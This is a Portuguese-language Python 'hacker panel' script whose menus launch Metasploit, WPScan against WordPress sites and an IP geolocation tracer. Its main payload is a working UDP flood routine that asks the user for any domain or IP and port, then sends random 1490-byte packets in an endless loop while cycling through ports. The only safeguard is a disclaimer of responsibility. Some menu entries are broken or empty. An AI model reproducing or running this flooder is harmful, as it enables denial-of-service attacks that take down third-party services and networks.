# Atenção: ESTE SCRIPT FOI DESENVOLVIDO POR (Real Stint Ghost) ESTE SCRIPT TEM COMO OBJETIVO AUTOMATIZAR FERRAMENTAS EM MODO (Painel).
#Algumas ferramentas foram feitas por outras pessoas! Eu as modifiquei mais os creditos esta nos arquivos do script, se quiser consultar :)

import subprocess
import random
from platform import system
from urllib import request
from tqdm.auto import tqdm
import sys
import socket
import base64, codecs
import os
import time
import getpass
import colorama
from colorama import init, Fore, Back, Style     # Adicionando cores no scripts//Codificando..
init(autoreset=True)
import random
from urllib import request
path=os.getcwd()
path=os.path.join(path, 'lib')
sys.path.append(path)
from tqdm.auto import tqdm
de_version='1.1'
colorama.init()
def clearConsole():
    command = 'clear'
    if os.name in ('nt', 'dos'):
        command = 'cls'
    os.system(command)
def menu():
    os.system('clear')
    print(Style.BRIGHT+Fore.RED+Fore.YELLOW+''' ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▄▄██████▄                                      #Versao 1.7 Atulizada e melhorada... Ainda em desenvolvimento!
▒▒▒▒▒▒▒▒▒▒▄▄████████████▄
▒▒▒▒▒▒▄▄██████████████████                                 {*****Powered******}
▒▒▒▄████▀▀▀██▀██▌███▀▀▀████                                {                  }
▒▒▐▀████▌▀██▌▀▐█▌████▌█████▌                               {Ciador:Em Anonimo }
▒▒█▒▒▀██▀▀▐█▐█▌█▌▀▀██▌██████                               {Versao: 1.7       }
▒▒█▒▒▒▒████████████████████▌                               {********By********}
▒▒▒▌▒▒▒▒█████░░░░░░░██████▀
▒▒▒▀▄▓▓▓▒███░░░░░░█████▀▀
▒▒▒▒▀░▓▓▒▐█████████▀▀▒
▒▒▒▒▒░░▒▒▐█████▀▀▒▒▒▒▒▒
▒▒░░░░░▀▀▀▀▀▀▒▒▒▒▒▒▒▒▒
▒▒▒░░░░░░░░▒▒▒▒▒▒▒▒▒▒''')


    print('                         𝚂𝚎𝚓𝚊 𝙱𝚎𝚖 𝚅𝚒𝚗𝚍𝚘 𝚄𝚜𝚞𝚊𝚛𝚒𝚘 :))	') 
    time.sleep(1) #Tempo de 1 segundos
    nomes_users = 'Ghost'
    nome_correto = nomes_users
    nome = input(Fore.RED+Style.BRIGHT+'𝙐SER DE ACESSO: ')
     
    if nome == nome_correto:
        print('Ola! senha bem vindo,', nome)
    else:
        print('Usuario incorreto!')
        exit()
    os.system('clear')
    time.sleep(1)
    print('')

    senha_correta = 'MR'
    senha_digitada = getpass.getpass('Digite a senha: ')

    if senha_digitada == senha_correta:
         time.sleep(2)
         print(Back.GREEN + Fore.YELLOW +  'Acesso Permitido')
    else:
        print('Acesso Negado!')
        exit()
    print('')
    print('𝙰𝚐𝚞𝚊𝚛𝚍𝚎.... 𝙲𝚊𝚛𝚛𝚎𝚐𝚊𝚗𝚍𝚘 𝚖𝚎𝚗𝚞....') 
    print('')
    
    print(Fore.RED + '''___________________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶ 
_________________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶ 
__¶_¶__________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶______¶__¶__¶ 
__¶_¶__¶______¶¶¶¶¶¶____¶¶¶¶¶¶____¶¶¶¶¶¶______¶_¶_¶ 
¶_¶_¶_¶______¶¶¶¶¶¶______¶¶¶¶______¶¶¶¶¶¶¶____¶¶¶¶¶ 
_¶¶¶¶¶______¶¶¶¶¶¶¶___O_¶¶¶¶¶__O__¶¶¶¶¶¶¶¶_¶¶¶¶¶¶¶ 
_¶¶¶¶¶¶¶¶__¶¶¶¶¶¶¶¶¶____¶¶¶¶¶¶____¶¶¶¶¶¶¶¶¶¶___¶¶¶ 
____¶¶____¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶____¶¶ 
____¶_____¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶__¶¶___¶ 
_____¶¶¶¶¶¶¶¶__¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶__¶¶¶¶¶¶ 
__________¶¶¶__¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶__¶¶¶ 
___________¶¶¶_____¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_____¶¶ 
____________¶¶________¶¶¶¶¶¶¶¶¶¶_______¶¶ 
_____________¶¶¶_______________________¶ 
_______________¶¶____¶¶¶¶¶¶¶¶¶¶¶______¶ 
________________¶¶¶_____¶¶¶¶¶¶¶¶¶¶¶__¶ 
___________________¶¶¶_____¶¶¶¶¶¶¶¶¶¶ 
______________________¶¶¶¶¶__¶¶¶¶¶¶¶¶¶ 
_____________________________¶¶¶¶¶¶¶¶¶¶ 
______________________________¶¶¶¶¶¶¶¶¶
''')

   






    print(Back.GREEN + ''' {DIGITE O NUMERO 1}
              {LOGO DE ENTER....}
    ''')
    digite = input('Digite 1> ')
    if digite == '1':
        menu2()


def menu2():
    os.system('clear')
    print(Back.GREEN + '                                               MENU HACKER - DONO/GHOST/FANTASMA ATAQUES DDOS    ')
    print(Fore.RED + Style.BRIGHT + '''
    	
          ______________________________
         {  [1] - PACK DE FERRAMENTAS  }
         {  FOR - LINUX AND TERMUX     }                                       
         {                             }                                         --------->AVISO-ACIMA<----------
         {  [2] - IR PARA O ATAQUE     }  
         {    xDDoS NEGAÇÃO DE DADOS   }                     #Lembando, nao tenho responsabilidade nenhuma sobre suas devidas ações erradas!
         {                             }
         {  [3] - METASPLOIT START     }
         {                             }              #AVISO: ALGUMAS FERRAMENTAS FORAM CRIADAS POR OUTROA AUTORES, ESTE SCRIPT TEM COMO  
         {  [4] - AINDA INDISPONIVEL   }                      OBJETIVO AUTOMATIZAR AS FERRAMENTAS EM UM PAINEL! 
         {                             }          
         {  [00] - Sair                }               ATENÇÃO: O AUTOR DO SCRIPT NÃO SE RESPONSABILIZARA PELO MAH USO DAS FERRAMENTAS
         {                             }                        OU QUALQUER AITITUDE INAPROPRIADE (ILEGAL) !!!
         {  [6] - PUXA LOCALIZAÇÃO     }
         {         USANDO - IP         }
         {                             }
         {  [7] - Scaneador de vulne   }
         {   rabilidade; WordPress     }
         {_____________________________}
                           
    ''')                                                          
    print('')

    print(Fore.YELLOW+Style.BRIGHT+'''                                                                                    
 ____   _    ___ _   _ _____ _             
|  _ \ / \  |_ _| \ | | ____| |        _   
| |_) / _ \  | ||  \| |  _| | |      _| |_ 
|  __/ ___ \ | || |\  | |___| |___  |_   _|
|_| /_/   \_\___|_| \_|_____|_____|   |_|  
                                        ''')
    print('')

    opcao = input (Fore.GREEN+Style.BRIGHT+Fore.YELLOW+'Digite a opção que deseja: ')
    if opcao == '1':
        os.system('git clone https://github.com/ivam3/termux-packages.git')
    elif opcao == '2':
        ddos()
    elif opcao == '3':
        os.system('msfconsole')
    elif opcao == '00':
        exit()
    elif opcao == '5':
        menu4()
    elif opcao == '7':
        menu5()
    elif opcao == '6':
        menu6()
    else:
        print('opçao invalida!')
        menu2()
    


def menu3():
    from platform import system
    import random
    from urllib import request
    import sys
    path=os.getcwd()
    path=os.path.join(path,'lib')
    sys.path.append(path)
    import colorama
    from colorama import Fore,Back,Style
    from tqdm.auto import tqdm
    de_version="1.1"
    colorama.init()
    def clearConsole():
        command = 'clear'
        if os.name in ('nt', 'dos'):  
            command = 'cls'
        os.system(command)
    
def ddos():    
    def banner():
        clearConsole()
        print(Fore.YELLOW + Fore.RED +'''
                                                      
          || .---.          || .---.          || .---.          || .---.
          ||/_____/         ||/_____/         ||/_____/         ||/_____/
          ||( '.' )         ||( '.' )         ||( '.' )         ||( '.' )
          ||_\_-_/_         ||_\_-_/_         ||_\_-_/_         ||_\_-_/_
          :-"`'V'//-.       :-"`'V'//-.       :-"`'V'//-.       :-"`'V'//-.
         / ,   |// , `\    / ,   |// , `\    / ,   |// , `\    / ,   |// , `/
        / /|Ll //Ll|| |   / /|Ll //Ll|| |   / /|Ll //Ll|| |   / /|Ll //Ll|| |
       /_/||__//   || |  /_/||__//   || |  /_/||__//   || |  /_/||__//   || |
       \ \/---|[]==|| |  \ \/---|[]==|| |  \ \/---|[]==|| |  \ \/---|[]==|| |
        \/\__/ |   \| |   \/\__/ |   \| |   \/\__/ |   \| |   \/\__/ |   \| |
        /\|_   | Ll_\ |   /|/_   | Ll_\ |   /|/_   | Ll_\ |   /|/_   | Ll_\ |
        `--|`^"""^`||_|   `--|`^"""^`||_|   `--|`^"""^`||_|   `--|`^"""^`||_|
           |   |   ||/       |   |   ||/       |   |   ||/       |   |   ||/
           |   |   |         |   |   |         |   |   |         |   |   |
           |   |   |         |   |   |         |   |   |         |   |   |
           |   |   |         |   |   |         |   |   |         |   |   |
           L___l___J         L___l___J         L___l___J         L___l___J
            |_ | _|           |_ | _|           |_ | _|           |_ | _|
           (___|___)         (___|___)         (___|___)         (___|___)       
   '''+Style.RESET_ALL+Fore.YELLOW+Style.BRIGHT+''' 
                            ·▄▄▄▄  ·▄▄▄▄        .▄▄ · 
                            ██▪ ██ ██▪ ██ ▪     ▐█ ▀. 
                            ▐█· ▐█▌▐█· ▐█▌ ▄█▀▄ ▄▀▀▀█▄
                            ██. ██ ██. ██ ▐█▌.▐▌▐█▄▪▐█
                            ▀▀▀▀▀• ▀▀▀▀▀•  ▀█▄▀▪ ▀▀▀▀ 

        '''+Style.RESET_ALL+Fore.MAGENTA+Style.BRIGHT+'''
by: Ghost   
             
        '''+Style.RESET_ALL)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)

    def chech_con():
        try:
            request.urlopen('https://www.google.co.in/',timeout=3)
        except KeyboardInterrupt:
            print(Fore.RED+Style.BRIGHT + "Interrompido pelo usuario..." + Fore.RESET)
            exit()
        except:
            print(Fore.RED+Style.BRIGHT+'Por favor checar a sua conexão com  a internet...'+Fore.RESET)
            exit()
 
    try:
        print(Fore.CYAN+Style.BRIGHT+"Verificando conexão com a internet.... "+Fore.RESET)
        for i in tqdm(range(30000)):
            print(end=Fore.MAGENTA+Style.BRIGHT+'\r')

        time.sleep(1)
        chech_con()

    except KeyboardInterrupt:
        print(Fore.RED +Style.BRIGHT+ "Interrompido pelo Usuario usuario" + Fore.RESET)
        exit()
    try:
        while True:
            banner()
            
            print(Fore.GREEN+Style.BRIGHT+"1."+Style.RESET_ALL+Fore.YELLOW+" Dominio do site web"+Fore.GREEN+Style.BRIGHT+"\n2."+Style.RESET_ALL+Fore.YELLOW+" Endereço IP"+Fore.GREEN+Style.BRIGHT+"\n3."+Style.RESET_ALL+Fore.YELLOW+" Sair")
            print(Fore.GREEN+Style.BRIGHT+'4.'+Style.RESET_ALL+Fore.YELLOW+' Voltar ao menu')
            opt=str(input(Fore.RED+Style.BRIGHT+"\n>>> "+Fore.RESET))
            if opt=='1':
                domain=str(input(Fore.CYAN+Style.BRIGHT+"Digite o site web(ej:google.com):"+Fore.RESET))
                ip=socket.gethostbyname(domain)
                break
            elif opt=='2':
                ip = input(Fore.CYAN+Style.BRIGHT+"Endereço IP  : "+Fore.RESET)
                break
            elif opt=='3':
                time.sleep(1)
                print(Fore.RED+"Nos vemos em breve :D"+Fore.RESET)
                exit()
            elif opt == '4':
                menu2()
            else:
                print(Fore.RED+'Opção Invalida!!'+Fore.RESET)
                time.sleep(2)

        port =int(input(Fore.CYAN+Style.BRIGHT+"Numero da porta  : "+Fore.RESET))

        print(Fore.YELLOW+Style.BRIGHT+"Iniciando...."+Style.RESET_ALL)
        clearConsole()
        time.sleep(2)

        print(Fore.RED+Back.LIGHTGREEN_EX+"Iniciando o ataque X.X ..."+Style.RESET_ALL)
        for i in tqdm(range(30000)):
            print(end=Fore.MAGENTA+'\r')
        time.sleep(1)
        sent = 0
    except Exception as e:
        print(Fore.RED+"¡Algo deu errado :(!")
        print("Razão: ",e,Fore.RESET)
        time.sleep(3)
        ddos()
    try:
        while True:
            sock.sendto(bytes, (ip,port))
            sent=sent+1
            port=port+1
            color_list = [Fore.RED+Style.BRIGHT+Back.MAGENTA, Fore.GREEN+Style.BRIGHT+Back.RED, Fore.YELLOW+Style.BRIGHT+Back.GREEN, Fore.BLUE+Style.BRIGHT+Back.CYAN, Fore.MAGENTA+Style.BRIGHT+Back.WHITE, Fore.CYAN+Style.BRIGHT+Back.BLUE, Fore.WHITE+Style.BRIGHT+Back.RED ]
            color_random = random.choice(color_list)

            print(color_random+"Pacote %s enviado %s atravas da porta:%s" % (sent, ip, port))
            if port==65534:
                port=1
            elif port==1900:
                port=1901
    except Exception as e:
        print(Fore.RED+Style.BRIGHT+"Concluido\nRazão: ",e,Fore.RESET)
        time.sleep(3)
        ddos()
    except KeyboardInterrupt:
        print(Fore.RED+Style.BRIGHT+"\nInterrompido pelo usuario"+Fore.RESET)


def menu4():
    print('MENU ACHA LOCALIZAÇÃO - ANTI PEDOFILO!!!!    ')

    print('')
    print('''       _______________________________ 
               { [1] Clique aqui para ir para }
               {   o geolocalizador de pdfls  }
               {                              }
               { [2] Clique aqui para voltar  }
               {     Ao menu anterior!!!      }
               {______________________________}
''')

    escola = input('Escolha: ')


    if escola == '1':
        digite = input('Digite o ip da vitima: ')
    elif escola == '2':
        menu2()


def menu5():
    os.system('clear')
    print(Back.GREEN + '        SCANEADOR DE VULNERABILIDADES USANDO WPSCAN - SOMENTE SITES WORDPRESS')
    print('')
    print(Fore.RED + 'Aguarde 4, carregando...')
    print('')
    print(Back.RED + '''               {-------------TABELA-------------}                ------->ATENÇÃO<-------
               { [1] - ENCONTRE VULNERABILIDADES}
               {                                }                            Para usa-lo deve usar o manual que esta na pasta do script!
               { [2] - VOLTAR AO MENU ANTERIOR..}        #utlize: sudo wpscan --url [url do site aqui <-] 
               {                                }
               { [3] - ABAIXE O WPSCAN VULN.I   }                  #Para uso de brute force, de ver os usuarios e falhas, utilizar o manual que esta no arquivo!!!
               {________________________________}  


 ''')
    escolha = input('Escolha: ')
    if escolha == '1':
        os.system('sudo wpscan')
    elif escolha == '2':
        menu2()
    elif escolha == '3':
        os.system('https://github.com/VolkanSah/WordPress-Security-Scanner-advanced-use.git')

def menu6():
    os.system('clear')
    print(Fore.RED + ''' 
                 {---------------------------------------------}
                 { [1] -  ENTRAR NO MENU DE LOCALIZAÇÃO EM BASH}                      #Tera um menu, nete menu vcs digitem: ip-tracer start
                 { [2] -  Sair                                 }                       $: Estara iniciando o menu do script!!!
                 { [3] -  Voltar a pagina anterior             }  
                 {_____________________________________________}
    ''')
    opcao = input(Back.GREEN + 'Escolha: ')
    
    if opcao == '1':
        subprocess.run(['bash', 'ip-tracer'])
    elif opcao == '2':
        exit()
    elif opcao == '3':
        menu2()
    else:
        print('Invalido! Voltando...')
        menu2()


menu()
